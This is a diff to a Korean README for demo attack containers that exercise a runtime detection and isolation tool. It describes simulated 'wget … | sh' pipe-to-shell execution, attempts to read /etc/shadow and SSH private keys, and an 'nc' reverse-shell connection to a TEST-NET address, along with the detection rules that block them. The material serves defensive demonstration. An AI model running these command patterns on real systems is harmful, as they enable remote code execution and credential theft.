@@ -1,16 +1,40 @@
 # 데모 컨테이너
 
-EC2(가젯 소스)에서 탐지·격리를 눈으로 확인하는 스크립트. 로컬 macOS 에서는 `EVENT_SOURCE=mock` 이
+EC2·sg-vm(가젯 소스)에서 탐지·격리를 눈으로 확인하는 스크립트. 로컬 macOS 에서는 `EVENT_SOURCE=mock` 이
 같은 시나리오를 대신 재생하므로 이 스크립트는 필요 없다.
 
 | 스크립트 | 컨테이너 | 하는 일 |
 | --- | --- | --- |
 | `run-victim.sh` | `victim` | 2초마다 `cat`·`wget example.com` — 정상 이벤트 기준선 |
-| `run-attacker.sh` | `pkg-reqeusts` | 시나리오 1→2→3 (`curl\|sh` → `/etc/shadow` → `203.0.113.7:4444`) 한 번 실행. `LOOP=1` 이면 10초마다 반복 |
+| `run-attacker.sh` | `pkg-reqeusts` | 아래 공격 시나리오 실행(`SCENARIO`, 기본 `all`). `LOOP=1` 이면 10초마다 반복, `DRY=1` 이면 docker 인자만 출력 |
 | `cleanup.sh` | | 위 컨테이너 제거 |
 
-기본 정책(`backend/policies/default.yaml`)과 `ENFORCE_KILL=true` 면 attacker 는 시나리오 1 에서
-`no-shell-download`/`pipe-to-shell` 에 걸려 종료된다. 세 시나리오를 모두 보고 싶으면 대시보드 정책 화면에서
-해당 정책을 dry-run 으로 바꾸거나 `.env` 의 `ENFORCE_KILL=false` 로 전역 dry-run 을 켠다.
+## 공격 시나리오
 
-목적지 `203.0.113.0/24` 는 문서용 TEST-NET-3 대역이라 실제 연결은 일어나지 않는다(타임아웃).
+`run-attacker.sh` 는 `SCENARIO=all|shell|revshell|direct-ip|domain|udp` 로 고른다. 시나리오마다 컨테이너를
+따로 띄우고 **그 시나리오의 코드만** 넘긴다(`all` 은 아래 순서로 하나씩). 한 덩어리로 넘기면 컨테이너 PID1 인자에
+다른 시나리오의 문자열이 섞여 엉뚱한 규칙에 먼저 걸리기 때문이다. 확인: `DRY=1 SCENARIO=domain bash run-attacker.sh`.
+
+설치 샌드박스용 `reqeusts/setup.py` 는 같은 시나리오를 `SG_DEMO_SCENARIOS`(쉼표 구분, 기본 `all`)로 고른다.
+각 시나리오는 시작 시 `[demo] <id> start` 를 찍어 이벤트 시각을 맞출 수 있다.
+
+| id | 이미지 | 행위 | 걸리는 규칙 | 기대 판정 | 확인 방법 |
+| --- | --- | --- | --- | --- | --- |
+| `shell` | busybox | `wget … \| sh` 외부 스크립트 실행 패턴 + `/etc/shadow`·`/root/.ssh/id_rsa` 열기 시도 | `no-shell-download`·`pipe-to-shell`·`sensitive-files` (샌드박스는 `sandbox-secrets`) | **kill** | 이벤트 화면 위반 / 감사 로그 규칙 필터 |
+| `revshell` | busybox | `nc 203.0.113.7 4444` TCP | `reverse-shell-ports` + `no-shell-download`(nc) — 함께 걸리는 게 의도 | **kill** | 감사 로그 `reverse-shell-ports` 필터 |
+| `direct-ip` | python | DNS 없이 `203.0.113.7:443` TCP | 런타임 `runtime-direct-ip` / 샌드박스 `sandbox-egress` | 런타임 **alert** · 샌드박스 **kill** | 이벤트 화면 「IP 직접 연결」 |
+| `domain` | python | `example.com:443` TCP (실제로 해석됨 → 목적지 도메인 표시) | `blocklist-hosts`(차단 목록 도메인) | 차단 목록에 `example.com` 을 올린 뒤 **kill** · 올리기 전 **정상 통과**(443 허용) | 이벤트 화면 목적지 도메인 / 감사 로그 `blocklist-hosts` 필터 |
+| `udp` | python | `203.0.113.7:53`·`:4444` UDP 2개(응답 안 기다림) | 없음 — 엔진이 TCP 만 관찰 | **미탐**(음성 대조군) | 이벤트 화면에 **뜨지 않음**을 확인 |
+
+- `domain`: 정책 화면에서 차단 목록(도메인)에 `example.com` 을 올린 뒤 실행하면 `blocklist-hosts` 로 kill 된다.
+  올리기 전에는 443 이 허용 포트라 정상 통과한다. example.com 은 IANA 문서용 예약 도메인이고 접속만 하고 데이터는 보내지 않는다.
+- `udp`: 현재 엔진이 UDP 를 보지 못한다는 한계를 보여 주는 **음성 대조군**이다. 이벤트에 나타나지 않는 것이 정상이다.
+- 타이밍: TEST-NET 목적지(`203.0.113.0/24`)는 접속이 실패할 때(타임아웃 약 3초 뒤) connect 이벤트가 나오므로
+  격리도 그 뒤에 일어난다. 실제로 도달 가능한 서버(example.com 등)면 즉시 나온다.
+
+목적지는 RFC 5737 TEST-NET 과 IANA 예약 도메인 `example.com` 뿐이다. 실제 악성 코드·실데이터는 없다.
+
+## 판정 끄고 전부 보기
+
+`ENFORCE_KILL=true` 면 각 시나리오가 첫 위반에서 종료된다. 판정만 보고 싶으면 대시보드 정책 화면에서 해당 정책을
+dry-run 으로 바꾸거나 `.env` 의 `ENFORCE_KILL=false` 로 전역 dry-run 을 켠다.
